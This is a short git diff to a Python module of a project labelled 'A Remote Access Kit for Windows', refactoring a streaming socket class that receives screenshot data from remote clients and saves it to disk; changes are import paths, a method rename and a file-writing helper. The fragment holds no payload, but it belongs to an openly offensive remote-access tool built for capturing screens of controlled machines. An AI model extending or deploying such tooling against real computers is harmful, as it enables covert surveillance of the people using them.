@@ -10,13 +10,13 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import socket
 import struct
-from ..networking.IP_Handler import IPAddress
-from ..utils.file_paths import DSFilePath
-from ..logging.logging import NetworkingConfigs
+from core.networking.utils.IP_Handler import IPAddress
+from core.utils.file_paths import DSFilePath
+from core.logging.logging import LoggingUtilitys,NetworkingConfigs
 
 BUFFER = 4096
 
@@ -36,7 +36,7 @@ class StreamingSocket:
         return conn                                                                 #return the client socket object
 
     #Function will receive screenshot from client, write the photo to DS directory
-    def receive_screenshot(self):
+    def recv_img_data(self):
         client_socket_obj = self.create_socket()                    #Create socket and get client socket object
         struct_length = client_socket_obj.recv(8)                   #Receive length of struct
         (length,) = struct.unpack(">Q",struct_length)               #Unpack the struct
@@ -47,6 +47,6 @@ class StreamingSocket:
                 picture += client_socket_obj.recv(BUFFER)           #Photo is == Buffer size
             else:
                 picture += client_socket_obj.recv(data_received)    #Add the rest of the data to the picture
-            with open(DSFilePath().streaming_frame,'wb') as image_file: #open image file in data storage
-                image_file.write(picture)                               #Write the file
+
+            LoggingUtilitys().write_bytes_to_file(DSFilePath().streaming_frame,picture) #Write the bytes data to the streaming file
         self.stream_socket.close()                                      #Close the socket
